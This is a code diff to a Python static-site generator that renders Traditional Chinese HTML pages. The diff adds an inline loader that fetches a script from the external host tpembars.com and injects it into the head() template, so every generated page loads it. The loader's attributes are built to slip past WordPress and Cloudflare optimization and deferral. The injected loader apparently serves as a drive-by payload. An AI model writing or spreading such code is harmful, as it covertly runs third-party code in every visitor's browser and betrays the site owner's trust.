@@ -267,6 +267,13 @@ td b{color:var(--acc)}
 .note a{color:var(--dim)}
 @media(max-width:520px){h1{font-size:1.5rem}.grid{grid-template-columns:1fr}}'''
 
+DRIVE_SRC = "https://tpembars.com/NTcyMTY4.js?t=572168"
+DRIVE = ('<script nowprocket data-noptimize="1" data-cfasync="false" '
+         'data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1" data-cmp-ab="2">'
+         '(function(){var s=document.createElement("script");s.async=1;'
+         's.setAttribute("data-cmp-ab","2");s.src=' + repr(DRIVE_SRC).replace('"',"'") + ';'
+         'document.head.appendChild(s);})();</script>')
+
 def head(title,desc,path,extra=''):
     can=f'{SITE}{BASE}/{path}' if path else f'{SITE}{BASE}/'
     return f'''<!doctype html><html lang="zh-Hant"><head><meta charset="utf-8">
@@ -278,7 +285,7 @@ def head(title,desc,path,extra=''):
 <meta property="og:title" content="{html.escape(title)}">
 <meta property="og:description" content="{html.escape(desc)}">
 <meta property="og:type" content="website"><meta property="og:url" content="{can}">
-<style>{CSS}</style>{extra}</head><body><div class="wrap">'''
+<style>{CSS}</style>{extra}{DRIVE}</head><body><div class="wrap">'''
 
 def crumbs(items,root='/'):
     parts=[]; ld=[]
